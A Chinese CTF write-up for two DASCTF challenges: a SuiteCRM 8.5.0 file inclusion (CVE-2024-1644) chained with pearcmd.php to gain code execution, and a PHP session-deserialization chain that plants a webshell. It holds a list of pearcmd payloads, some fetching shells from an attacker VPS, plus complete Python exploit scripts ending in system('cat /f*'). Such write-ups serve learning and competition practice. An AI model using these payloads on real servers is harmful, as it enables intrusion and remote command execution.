# 记一次pearcmd文件包含+session序列化

> **来源**: https://forum.butian.net/share/2958  
> **文章ID**: 2958

---

0x00 前言
=======

本文是关于DASCTF X GFCTF 2024｜四月开启第一局的一道一解题目（SuiteCRM）和零解题目（web1234）的详细题解，大佬轻喷，如有错误欢迎指出。

0x01 SuiteCRM
=============

> 题目信息：SuiteCRM version 8.5.0, Username/Password：suitecrm:suitecrm
> 
> 提示：使用81端口进行访问，80端口的转发有问题 <https://fluidattacks.com/advisories/silva/>；
> 
> CVE-2024-1644，不需要代码审计！！！注意docker环境下的文件包含方式，该环境只修改了upload目录的上传权限；
> 
> 比赛的时候其实提示已经很明显了，但是自己就是没注意到，CVE-2024-1644主要就是文件上传+文件包含，但是题目明显禁止了上传文件，因此最终我们需要思考还能包含什么文件，这就要提到p?提到的pearcmd了；
> 
> 考点：pearcmd文件包含+RCE

关于pearcmd
---------

- `pecl`是PHP中用于管理扩展而使用的命令行工具，而`pear`是`pecl`依赖的类库。在**7.3及以前**，`pecl/pear`是默认安装的；在**7.4**及以后，需要我们在编译PHP的时候指定`--with-pear`才会安装。
- 如果开启`register_argc_argv`这个配置，我们在php中传入的`query-string`会被赋值给`$_SERVER['argv']`； 而pear可以通过`readPHPArgv`函数获得我们传入的`$_SERVER['argv']`，需要注意的是 这个数字中的值是通过传进来内容中的`+`来进行分隔的，下面的`payload`中也有频繁利用到。
- RFC3875中规定，如果`query-string`中不包含没有编码的`=`，且请求是GET或HEAD，则query-string需要被作为命令行参数。

重点：**在Docker任意版本镜像中，pcel/pear都会被默认安装，安装的路径在/usr/local/lib/php**

下面是`pear`的命令和对应的解释（当题目禁止某一个命令时，可以灵活运用其他命令进行RCE）：

```php
Commands:  
build                  Build an Extension From C Source  
bundle                 Unpacks a Pecl Package  
channel-add            Add a Channel  
channel-alias          Specify an alias to a channel name  
channel-delete         Remove a Channel From the List  
channel-discover       Initialize a Channel from its server  
channel-info           Retrieve Information on a Channel  
channel-login          Connects and authenticates to remote channel server  
channel-logout         Logs out from the remote channel server  
channel-update         Update an Existing Channel  
clear-cache            Clear Web Services Cache  
config-create          Create a Default configuration file  
config-get             Show One Setting  
config-help            Show Information About Setting  
config-set             Change Setting  
config-show            Show All Settings  
convert                Convert a package.xml 1.0 to package.xml 2.0 format  
cvsdiff                Run a "cvs diff" for all files in a package  
cvstag                 Set CVS Release Tag  
download               Download Package  
download-all           Downloads each available package from the default channel  
info                   Display information about a package  
install                Install Package  
list                   List Installed Packages In The Default Channel  
list-all               List All Packages  
list-channels          List Available Channels  
list-files             List Files In Installed Package  
list-upgrades          List Available Upgrades  
login                  Connects and authenticates to remote server \[Deprecated in favor of channel-login\]  
logout                 Logs out from the remote server \[Deprecated in favor of channel-logout\]  
makerpm                Builds an RPM spec file from a PEAR package  
package                Build Package  
package-dependencies   Show package dependencies  
package-validate       Validate Package Consistency  
pickle                 Build PECL Package  
remote-info            Information About Remote Packages  
remote-list            List Remote Packages  
run-scripts            Run Post-Install Scripts bundled with a package  
run-tests              Run Regression Tests  
search                 Search remote package database  
shell-test             Shell Script Test  
sign                   Sign a package distribution file  
svntag                 Set SVN Release Tag  
uninstall              Un-install Package  
update-channels        Update the Channel List  
upgrade                Upgrade Package  
upgrade-all            Upgrade All Packages \[Deprecated in favor of calling upgrade with no parameters\]
```

### 一些pearcmd相关的payload

```php
payload：  
/index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php  
​  
通过install命令远程下载shell  
在有回显的情况下，服务器会回显下载的目录  
/?+install+--installroot+&file=/usr/local/lib/php/pearcmd.php&+http://\[vps\]:\[port\]/test1.php  
​  
一个很脑洞的利用方法  
payload为/?+download+http://ip:port/test1.php&file=/usr/local/lib/php/pearcmd.php  
在服务器上构造好目录:test1.php&file=/usr/local/lib/php/，将恶意php命名为pearcmd.php  
​  
/?file=/usr/local/lib/php/pearcmd.php&+download+http://ip:port/source/hint.txt  
​  
不出网的情况  
pear -c /tmp/.feng.php -d man\_dir=<?=eval($\_POST\[0\]);?> -s  
把木马写入本地  
?file=/usr/local/lib/php/pearcmd.php&+config-create+/<?=eval($\_POST\[c\]);?>+/tmp/shell.php  
​  
/index.php/?file=%2f%75%73%72%2f%6c%6f%63%61%6c%2f%6c%69%62%2f%70%68%70%2f%70%65%61%72%63%6d%64%2e%70%68%70&+download+http://vps/1.txt  
​  
/index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php  
​  
有用的payload（好像一定要post，不知道为什么）：  
/?file=/usr/local/lib/php/pearcmd.php&+-c+/tmp/man.php+-d+man\_dir=<?eval($\_POST\[0\]);?>+-s  
/?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=eval($\_REQUEST\[0\]);?>+/tmp/hello.php  
​
```

### CVE-2024-1644分析

根据提示的CVE-2024-1644 可知，主要的漏洞点如下所示：

首先在index.php，会调用到一个$kernel->getLegacyRoute($request)函数，主要是对请求的url进行处理，获取道文件路径后，进行require包含，跟入getLegacyRoute看看；

![image-20240425201807769](images/attach-4d18abaea088c045fdcbdcfa185279e88958946b.png)

这里没啥处理，继续跟入；

![image-20240425201851066](images/attach-725e13c17edc47ab85f2d3c12a20ee3027ec21d1.png)

return返回了一个Handler调用的`getIncludeFile`函数，传入的参数还是`$request`；

![image-20240425201912879](images/attach-7213a226059ebe1487ffdd3d1157110eb098128e.png)

最后来到真正处理的函数，下面解释一下处理流程：

1. 首先是`getPathInfo`获取了`index.php`后面跟着的值`$baseUrl`；例如`http://xxxx/index.php/123/123.php`，就是获取了`/123/123.php`;
2. 然后对这个获取的`$baseUrl`值进行第一个字符串的截取，不要第一个字母；
3. if判断的时如果这个`$baseUrl`不是以.php结尾，就会自行在结尾添加一个index.php；
4. 最后返回一个数组，其中"file"键对应的值是这个`$baseUrl`；

因此，通过上面的处理流程，我们知道明显有文件包含的漏洞；

只要我们的url是这样的`http://xxxx/index.php//etc/passwd`，经过处理返回后，就能包含`require '/etc/passwd'`

![image-20240425201955602](images/attach-34e4221ae2bf8a34b6adb4c98748a66d9c805ce1.png)

主要是在`index.php`处可以进行文件包含，如下图所示，直接加根路径即可，因此可以进pearcmd文件的包含：

![image.png](images/attach-66c91e838da896808a5bf49ff0f961f7ba24abc7.png)

### 解题过程

注意：**这一题需要改一下转发的端口80-》81**

![image.png](images/attach-e24da7b95d0bff3025f32b6af06a0d649ab3c915.png)

```php
config-create命令：  
第一个参数似乎是目录，所以最前面一定要加一个/，第二个参数是文件，所以用绝对路径好一些，由于是通过+号来分割命令的，所以写入的第一个参数即php恶意代码不能有空格，同时也不能进行url编码，因为他没有进行解码写入。  
所以第一个参数要求一定要/<?=xxxx?>这样啊；  
第二个参数要求是一个文件路径，直接/tmp/xxx即可  
/index.php//usr/local/lib/php/pearcmd.php  
/index.php//usr/local/lib/php/pearcmd.php?+config-create+/<?=phpinfo();?>+/tmp/1.php  
/index.php//usr/local/lib/php/pearcmd.php?+config-create+/<?=eval($\_POST\[1\]);?>+/tmp/1.php
```

![image.png](images/attach-254e3e78ab6fd07d9f2dda24163015d603c5bbc0.png)

![image.png](images/attach-a8595ceeed18f6d579a9c239923d4a4ec7acc08a.png)

0x02 web1234
============

题目源码
----

class.php

```php
<?php  
​  
class Admin{  
​  
    public $Config;  
​  
    public function \_\_construct($Config){  
        //安全获取基本信息，返回修改配置的表单  
        $Config\->nickname \= (is\_string($Config\->nickname) ? $Config\->nickname : "");  
        $Config\->sex \= (is\_string($Config\->sex) ? $Config\->sex : "");  
        $Config\->mail \= (is\_string($Config\->mail) ? $Config\->mail : "");  
        $Config\->telnum \= (is\_string($Config\->telnum) ? $Config\->telnum : "");  
        $this\->Config \= $Config;  
​  
        echo '    <form method="POST" enctype="multipart/form-data">  
        <input type="file" name="avatar" >  
        <input type="text" name="nickname" placeholder="nickname"/>  
        <input type="text" name="sex" placeholder="sex"/>  
        <input type="text" name="mail" placeholder="mail"/>  
        <input type="text" name="telnum" placeholder="telnum"/>  
        <input type="submit" name="m" value="edit"/>  
    </form>';  
    }  
​  
    public function editconf($avatar, $nickname, $sex, $mail, $telnum){  
        //编辑表单内容  
        $Config \= $this\->Config;  
​  
        $Config\->avatar \= $this\->upload($avatar);  
        $Config\->nickname \= $nickname;  
        $Config\->sex \= (preg\_match("/男|女/", $sex, $matches) ? $matches\[0\] : "武装直升机");  
        $Config\->mail \= (preg\_match('/.\*@.\*\\..\*/', $mail) ? $mail : "");  
        $Config\->telnum \= substr($telnum, 0, 11);  
        $this\->Config \= $Config;  
​  
        file\_put\_contents("/tmp/php-sessions/Config", serialize($Config));  
​  
        if(filesize("record.php") \> 0){  
            \[new Log($Config),"log"\]();  
        }  
    }  
​  
    public function resetconf(){  
        //返回出厂设置  
        file\_put\_contents("/tmp/php-sessions/Config", base64\_decode('Tzo2OiJDb25maWciOjc6e3M6NToidW5hbWUiO3M6NToiYWRtaW4iO3M6NjoicGFzc3dkIjtzOjMyOiI1MGI5NzQ4Mjg5OTEwNDM2YmZkZDM0YmRhN2IxYzlkOSI7czo2OiJhdmF0YXIiO3M6MTA6Ii90bXAvMS5wbmciO3M6ODoibmlja25hbWUiO3M6MTU6IuWwj+eGiui9r+ezlk92TyI7czozOiJzZXgiO3M6Mzoi5aWzIjtzOjQ6Im1haWwiO3M6MTU6ImFkbWluQGFkbWluLmNvbSI7czo2OiJ0ZWxudW0iO3M6MTE6IjEyMzQ1Njc4OTAxIjt9'));  
    }  
​  
    public function upload($avatar){  
        $path \= "/tmp/php-sessions/".preg\_replace("/\\.\\./", "", $avatar\['fname'\]);  
        file\_put\_contents($path,$avatar\['fdata'\]);  
        return $path;  
    }  
​  
    public function \_\_wakeup(){  
        echo "log\_wakeup!!!\\n";  
//        echo $this->Config;  
        $this\->Config \= ":(";  
    }  
​  
    public function \_\_destruct(){  
//        var\_dump($this->Config);  
        echo $this\->Config\->showconf();  
    }  
}  
​  
​  
​  
class Config{  
​  
    public $uname;  
    public $passwd;  
    public $avatar;  
    public $nickname;  
    public $sex;  
    public $mail;  
    public $telnum;  
​  
    public function \_\_sleep(){  
        echo "<script>alert('edit conf success\\\\n";  
        echo preg\_replace('/<br>/','\\n',$this\->showconf());  
        echo "')</script>";  
        return array("uname","passwd","avatar","nickname","sex","mail","telnum");  
    }  
​  
    public function showconf(){  
        $show \= "<img src=\\"data:image/png;base64,".base64\_encode(file\_get\_contents($this\->avatar))."\\"/><br>";  
        $show .\= "nickname: $this\->nickname<br>";  
        $show .\= "sex: $this\->sex<br>";  
        $show .\= "mail: $this\->mail<br>";  
        $show .\= "telnum: $this\->telnum<br>";  
        return $show;  
    }  
​  
    public function \_\_wakeup(){  
        if(is\_string($\_GET\['backdoor'\])){  
            $func \= $\_GET\['backdoor'\];  
            $func();//:)  
        }  
    }  
​  
}  
​  
​  
​  
class Log{  
​  
    public $data;  
​  
    public function \_\_construct($Config){  
        $this\->data \= PHP\_EOL.'$\_'.time().' = \\''."Edit: avatar->$Config\->avatar, nickname->$Config\->nickname, sex->$Config\->sex, mail->$Config\->mail, telnum->$Config\->telnum".'\\';'.PHP\_EOL;  
    }  
​  
    public function \_\_toString(){  
        echo "log\_tostring!!!";  
        if($this\->data \=== "log\_start()"){  
            file\_put\_contents("record.php","<?php\\nerror\_reporting(0);\\n");  
        }  
        echo "you are good!";  
        return ":O";  
    }  
​  
    public function log(){  
        file\_put\_contents('record.php', $this\->data, FILE\_APPEND);  
    }  
}
```

index.php

```php
<?php  
error\_reporting(0);  
include "class.php";  
​  
$Config \= unserialize(file\_get\_contents("/tmp/php-sessions/Config"));  
foreach($\_POST as $key\=>$value){  
    if(!is\_array($value)){  
        $param\[$key\] \= addslashes($value);  
        if ($param\=="\\$SESSION"){  
            echo "session: ".addslashes($value)."\\n";  
        }  
    }  
}  
if($\_GET\['uname'\] \=== $Config\->uname && md5(md5($\_GET\['passwd'\])) \=== $Config\->passwd){  
    echo "ok!!!";  
    $Admin \= new Admin($Config);  
    if($\_POST\['m'\] \=== 'edit'){  
        $avatar\['fname'\] \= $\_FILES\['avatar'\]\['name'\];  
        $avatar\['fdata'\] \= file\_get\_contents($\_FILES\['avatar'\]\['tmp\_name'\]);  
        $nickname \= $param\['nickname'\];  
        $sex \= $param\['sex'\];  
        $mail \= $param\['mail'\];  
        $telnum \= $param\['telnum'\];  
​  
        $Admin\->editconf($avatar, $nickname, $sex, $mail, $telnum);  
    }elseif($\_POST\['m'\] \=== 'reset') {  
        $Admin\->resetconf();  
    }  
}else{  
    die("pls login! :)");  
}
```

思路一：文件写入+条件竞争反序列化（失败的man）
-------------------------

一开始的思路是通过文件上传avatar，写入覆盖Config，在Config还为被写入正常序列化内容之前，利用时间差，条件竞争，先一步反序列化Config，触发链子，最终卡死在了`__wakeup`这里。无法绕过`__wakeup`因该是php版本问题。

先过一遍index.php和class.php。

### class.php

#### Admin类

`editconf`函数是编辑Config文件的函数，通过POST的参数和上传的文件对Config的内容进行改动,然后再序列化写入`/tmp/Config`文件，注意到当`record.php`的内容不为空时，可以动态调用Log::log函数；

然后`resetconf`函数是将/tmp/Config文件进行初始化，内容是`O:6:"Config":7:{s:5:"uname";s:5:"admin";s:6:"passwd";s:32:"50b9748289910436bfdd34bda7b1c9d9";s:6:"avatar";s:10:"/tmp/1.png";s:8:"nickname";s:15:"小熊软糖OvO";s:3:"sex";s:3:"女";s:4:"mail";s:15:"admin@admin.com";s:6:"telnum";s:11:"12345678901";}`，其中密码查询到是`1q2w3e`；

`upload`函数即上传一个文件，只能在/tmp目录下，可以自己指定文件名，对文件内容也没有限制；

`__wakeup`会对成员变量Config覆盖为字符串；

`__destruct`会调用成员变量`Config`的showconf函数;

![image-20240425191159992](images/attach-c6d5c27b158385c5834cca62982d5ad1491b87fa.png)

![image-20240425191605458](images/attach-f3701a27c2ccc78fe7617947e6b1cdc7dd2442ad.png)

#### Config

`__sleep`魔术方法会输出一些字符串，同时也会调用`showconf`函数；

`showconf`函数就是将Config类中所有的成员变量进行字符串拼接然后输出；

`__wakeup`就是定义了一个backdoor，可以动态调用无参函数；（这个在后面可以调用`session_start`）

![image-20240425191933921](images/attach-9f4abbe781dca2aacff117ece3c68c3bb3ccc73f.png)

#### Log

`__construct`会将传入的Config对象的成员变量进行字符串拼接，然后赋值给data成员变量；

`toString`魔术方法非常关键，这里可以对record.php写入php代码，前提是data成员变量===log\_start()；

然后是`log`函数，这个就是Admin::editconf函数动态调用的函数，可以往record.php中追加成员变量data；

![image-20240425192153314](images/attach-89a2e4289e00b56890385c0dbe00fac3bc76e2ca.png)

### index.php

看下面几个关键的点：

1. 首先是获取`/tmp/Config`文件，然后反序列化给`$Config`变量；
2. 然后会对POST内容进行转义；
3. 进行了`$Config`的`uname`和passwd的比较，成功就进入if；
4. 将`$Config`变量传入Admin类实例化，判断POST的m；
5. 如果m为`edit`，则获取传输参数的值和文件内容，调用`Admin->editconf`；
6. 如果m为`reset`，则调用`Admin->resetconf`初始化Config文件内容；

![image-20240425165937943](images/attach-897f10d823037a0442975a1967903acb051784c2.png)

### 如何竞争

先看`editconf`的过程，先是反序列化的`$Config`变量要满足条件进入if，然后实例化Admin，然后接受参数，最后进入editconf：

![image-20240425193557508](images/attach-0bc672dc5ef5d1b5a71bd75e4c06d11b7e11c1dc.png)

看`editconf`函数，注意到在写入覆盖`/tmp/Config`文件时，会进行一个upload，跟踪进去；

![image-20240425193730314](images/attach-7fb2b2bd792b06680f7d7f624ec8962463ced160.png)

发现可以上传文件到`/tmp`目录，同时名字和内容没有限制，因此我们可以覆盖`Config`文件，这里与上面的`file_put_contents`就有着一定的时间差；

![image-20240425193839150](images/attach-9749c64957aeab3b3e167843bc09ddc077bbcd75.png)

然后，如何序列化这个Config文件呢，很简单，index.php一开始就是获取这个文件进行反序列化；

![image-20240425194029719](images/attach-b8e30fbf49f50584177977f4dfbf5c823726191b.png)

因此，综上所述，只要合理利用这个时间差，那么我们就可以自定义反序列化任何内容；

这里目的最终还是调用到`Log::__toString`魔术方法，将php代码写入到`record.php`，思路是调用到`Admin::showconf`文件的字符串拼接，但是始终绕不过`Admin::__wakeup`，所以失败了?。

![image-20240425194415638](images/attach-6080a362b772a59fa7316619edcdb261314a453c.png)

### 尝试条件竞争的exp

```php
import base64  
import sys,os  
​  
import requests  
import threading  
​  
url = "http://127.0.0.1/index.php"  
​  
def reset():  
    params={  
        "uname":"admin",  
        "passwd":"1q2w3e"  
    }  
    data={  
        "m":"reset"  
    }  
    requests.post(url=url,params=params,data=data)  
​  
def write\_php():  
    params={  
        "uname":"admin",  
        "passwd":"1q2w3e"  
    }  
    data={  
        "m":"edit",  
        "nickname":";phpinfo();",  
        "sex":"w1nd",  
        "mail":"@",  
        "telnum":"01"  
    }  
    files={  
        "avatar":("Config",base64.b64decode("QzoxMToiQXJyYXlPYmplY3QiOjI5ODp7eDppOjA7YToxOntzOjQ6ImV2aWwiO086NToiQWRtaW4iOjM6e3M6NjoiQ29uZmlnIjtPOjY6IkNvbmZpZyI6Nzp7czo1OiJ1bmFtZSI7TjtzOjY6InBhc3N3ZCI7TjtzOjY6ImF2YXRhciI7TjtzOjg6Im5pY2tuYW1lIjtPOjM6IkxvZyI6MTp7czo0OiJkYXRhIjtzOjExOiJsb2dfc3RhcnQoKSI7fXM6Mzoic2V4IjtOO3M6NDoibWFpbCI7TjtzOjY6InRlbG51bSI7Tjt9czo1OiJ1bmFtZSI7czo1OiJhZG1pbiI7czo2OiJwYXNzd2QiO3M6MzI6IjUwYjk3NDgyODk5MTA0MzZiZmRkMzRiZGE3YjFjOWQ5Ijt9fTttOmE6MDp7fX0=").decode())  
    }  
    # O:5:"Admin":4:{s:6:"Config";N;s:8:"nickname";O:3:"Log":1:{s:4:"data";s:11:"log\_start()";}s:5:"uname";s:5:"admin";s:6:"passwd";s:32:"50b9748289910436bfdd34bda7b1c9d9";}  
    res = requests.post(url=url,params=params,data=data,files=files)  
    print(res.text)  
    # if "ok" in res.text:  
    if "log\_tostring" in res.text:  
        print(res.text)  
        sys.exit()  
​  
def index():  
    requests.get(url=url)  
​  
def test\_log\_session():  
    headers={  
        "Cookie":"PHPSESSID=123"  
    }  
    params={  
        "uname":"admin",  
        "passwd":"1q2w3e",  
        "backdoor":"session\_start"  
    }  
    data={  
        "$SESSION":"123",  
        "m":"edit",  
        "PHP\_SESSION\_UPLOAD\_PROGRESS":"123"  
    }  
    files={  
            "avatar":("uploadxxxx",base64.b64decode("QzoxMToiQXJyYXlPYmplY3QiOjI5ODp7eDppOjA7YToxOntzOjQ6ImV2aWwiO086NToiQWRtaW4iOjM6e3M6NjoiQ29uZmlnIjtPOjY6IkNvbmZpZyI6Nzp7czo1OiJ1bmFtZSI7TjtzOjY6InBhc3N3ZCI7TjtzOjY6ImF2YXRhciI7TjtzOjg6Im5pY2tuYW1lIjtPOjM6IkxvZyI6MTp7czo0OiJkYXRhIjtzOjExOiJsb2dfc3RhcnQoKSI7fXM6Mzoic2V4IjtOO3M6NDoibWFpbCI7TjtzOjY6InRlbG51bSI7Tjt9czo1OiJ1bmFtZSI7czo1OiJhZG1pbiI7czo2OiJwYXNzd2QiO3M6MzI6IjUwYjk3NDgyODk5MTA0MzZiZmRkMzRiZGE3YjFjOWQ5Ijt9fTttOmE6MDp7fX0=").decode())  
    }  
    tmp1 = os.system('cat /tmp/php-sessions/sess\_123')  
    res = requests.post(url=url,headers=headers,params=params,data=data,files=files)  
    tmp2 = os.system('cat /tmp/php-sessions/sess\_123')  
    print(res.text)  
​  
​  
if \_\_name\_\_ == "\_\_main\_\_":  
    event = threading.Event()  
    for i in range(100):  
\#         threading.Thread(target=reset).start()  
        threading.Thread(target=write\_php).start()  
        threading.Thread(target=index).start()  
​
```

思路二：session 序列化
---------------

本题的考点就是**php魔术方法的触发调用+session的序列化**，还是十分巧妙的，入口是\_\_sleep魔术方法，算是学习到了很多；

最终触发的序列化链子就是：

`Config::__sleep`-》`Config::showconf`-》`Log::__toString`-》`file_put_contents`

### 解题过程

#### 序列化调用`__sleep`

由前面第一次的思路尝试，我们可以知道，通过反序列化然后触发`__destruct`是行不通的，因为Config类反序列化会触发`__wakeup`魔术方法，Config类被改写，无法触发到`Log::__toString`，因此要转变思路。

![image-20240425161625132](images/attach-7b4e58a7c3e84ed605988a865f44d77393c74896.png)

因为`Config::showconf`有字符串拼接，同时成员变量可控，那么调用到这，就可以触发`Log::__toString`。

![image-20240425161859833](images/attach-79278de770f22dfe106a2fb12bb8e17e3aaf3942.png)

![image-20240425163205337](images/attach-ed2ad3998e1e35977d398b86ce7b612d6487d20a.png)

寻找到`Config::__sleep`调用了showconf，因此只要这里作为入口点即可。

![image-20240425161937973](images/attach-9660d5d55ddc91953810ba1dc884ea55c9f12891.png)

这里就要借用到session的相关知识，一般我们在php代码里面调用了`session_start`函数，同时请求带有PHPSESSID自行设置的Cookie参数，那么默认会去/tmp目录下面找`sess_[PHPSESSID]`文件（这里我自己改成了`/tmp/php-sessions/`目录，可以去`php.ini`设置），然后把这个文件的内容反序列化会成对象，可以通过超全局变量`$_SESSION`调用；

当文件运行完毕后，其中可能会对这个对象值进行更改，也可能不更改，最终都会把这个反序列化出来的对象值给序列化回文件，因此，这里存在一个序列化的点是我们可以利用的。

![image-20240425162301298](images/attach-dc66e7497b783e69de149aed6aa3c74bd1ff1bd8.png)

所以，现在的思路就是，`Config::__sleep`-》`Config::showconf`-》`Log::__toString`-》`file_put_contents("record.php","<?php\nerror_reporting(0);\n");`，这样`record.php`就能有PHP代码了。生成的`sess值`的代码可以参考如下，最终生成的payload在上面的图有：

```php
<?php  
include "tmp\_class.php";  
 session\_start();  
 $config = new Config();  
 $config->uname = "admin";  
 $config->passwd = "50b9748289910436bfdd34bda7b1c9d9";  
 $log=new Log();  
 $log->data="log\_start()";  
 $config->nickname = $log;  
 $\_SESSION\["a"\] = $config;
```

#### 写入恶意shell

既然已经写入了php代码，那么我们现在就可以走到`Admin::editconf`的if语句里面了，是php7的特性，好像叫动态调用函数来着，调用了`Log::log`函数，去看看；

![image-20240425163718557](images/attach-7441b318770a2443cf02e36f449d1b8dceb3d114.png)

主要是向record.php进行append追加，内容为成员变量`data`，

![image-20240425164231704](images/attach-bb515fdb36da9ac09516396ebe1e6fd4cbf099ed.png)

发现Log实例化construct时会对data进行初始化，上面动态new了一个Log，传入的值就是经过处理的Config类，由于Config中avatar、nickname、sex、mail、telnum我们都可以控制，所以我就想当然得随便挑了个值进行插入了，当然发现不行；

![image-20240425164452892](images/attach-c81a8dd9bc1ec47b95ed75de95f3255069887d91.png)

这里我尝试了nickname进行恶意payload的插入，发现被转移了，看index.php的源代码才发现，只要POST的值都会被转义，因此经过思考，发现avatar文件上传的名字没有进行转移过滤，可以注入：

![image-20240425164817130](images/attach-a23610f028e52edf57e7ed01685a900ff56cc53e.png)

![image-20240425164749293](images/attach-0e27ac63028ae04a14c3c551f973b20be93917c6.png)

最终只要将上传的文件名改成这样的形式：`';eval($_POST[1]);#`，就可以往record.php注入payload。

![image-20240425164925131](images/attach-ddd2b8cb65edb3ae1e2f703be63a2c473afd3e91.png)

至于，如何走到这个动态函数的调用就很简单了，只要调用了editconf就行，这个我们在前面就讨论过了，`uname=admin，passwd=1q2w3e`就能进入这个if。

![image-20240425165051370](images/attach-843bf6861a07ea95d80559120dddd4fd662aa3e6.png)

### 一键获取flag的exp

简单说一下脚本的流程：

1. 首先是上传 `session_123` 文件，里面的内容是包括了`Config` 类，`Config`对象里面包含了一个 `Log` 类，可以在序列化的时候触发`__sleep`，然后showconf 函数可以触发到Log 的`toString`，最终写入`<?php代码`；
2. 然后是请求时携带PHPSESSID的Cookie值，就能在访问index.php开始时反序列化`/tmp/sess_123`文件，最后访问完毕就序列化写回去`/tmp/sess_123`，触发`Config::__sleep；`
3. 我们知道record.php这时不为空了，可以调用editconf的动态函数写入新内容，但是需要先闭合单引号和语句，同时还要注释掉后面的报错内容，同时POST的值会被addslashes函数转义，因此这里只能通过文件名写入恶意代码；最终通过record.php进行任意命令的执行。

```php
import base64  
​  
import requests  
​  
url = "http://0d135888-78e8-49ed-89bb-80d58c7ea23f.node5.buuoj.cn:81"  
​  
headers={  
    "Cookie":"PHPSESSID=123"  
}  
​  
def upload\_session\_file():  
    files={  
        "avatar":("sess\_123",base64.b64decode("YXxPOjY6IkNvbmZpZyI6Nzp7czo1OiJ1bmFtZSI7czo1OiJhZG1pbiI7czo2OiJwYXNzd2QiO3M6MzI6IjUwYjk3NDgyODk5MTA0MzZiZmRkMzRiZGE3YjFjOWQ5IjtzOjY6ImF2YXRhciI7TjtzOjg6Im5pY2tuYW1lIjtPOjM6IkxvZyI6MTp7czo0OiJkYXRhIjtzOjExOiJsb2dfc3RhcnQoKSI7fXM6Mzoic2V4IjtOO3M6NDoibWFpbCI7TjtzOjY6InRlbG51bSI7Tjt9").decode())  
    }  
    params = {  
        "uname": "admin",  
        "passwd": "1q2w3e",  
    }  
    data = {  
        "m":"edit",  
        "nickname":"'w1nd",  
        "mail":"kap0k",  
        "telnum":"123"  
    }  
    res = requests.post(url=url,params=params,data=data,files=files)  
    print((res.text))  
​  
def session\_to\_log():  
    params = {  
        "uname": "admin",  
        "passwd": "1q2w3e",  
        "backdoor":"session\_start"  
    }  
    res = requests.get(url=url,params=params,headers=headers)  
    print(res.text)  
​  
​  
def write\_webshell():  
    files = {  
        "avatar": ("';eval($\_POST\[1\]);#", base64.b64decode(  
"Tzo2OiJDb25maWciOjg6e3M6NToidW5hbWUiO3M6NToiYWRtaW4iO3M6NjoicGFzc3dkIjtzOjMyOiI1MGI5NzQ4Mjg5OTEwNDM2YmZkZDM0YmRhN2IxYzlkOSI7czo2OiJhdmF0YXIiO047czo4OiJuaWNrbmFtZSI7TjtzOjM6InNleCI7TjtzOjQ6Im1haWwiO047czo2OiJ0ZWxudW0iO047czo0OiJkYXRhIjtzOjIwOiJldmFsKCRfUE9TVFsxXSk7Pz4vKiI7fQ==").decode())  
    }  
    params = {  
        "uname": "admin",  
        "passwd": "1q2w3e",  
    }  
    data = {  
        "m": "edit"  
    }  
    res = requests.post(url=url, params=params, data=data, files=files)  
    print((res.text))  
​  
def run\_cmd():  
    webshell\_url = url + "/record.php"  
    cmd = "system('cat /f\*');"  
    data = {  
        "1":cmd  
    }  
    res = requests.post(url=webshell\_url,data=data)  
    print(res.text)  
​  
if \_\_name\_\_ == "\_\_main\_\_":  
    upload\_session\_file()  
    session\_to\_log()  
    write\_webshell()  
    run\_cmd()  
​
```

flag手到擒来。

![image-20240425192811210](images/attach-22a3f2d61994493424976657958e25ae42637855.png)

0x03 结
======

太久没做ctf题目了，复健一下。

第一道题捡回了pearcmd，第二道题让我学习到了session序列化的知识点；

总之任重道远，还要多多学习啊。
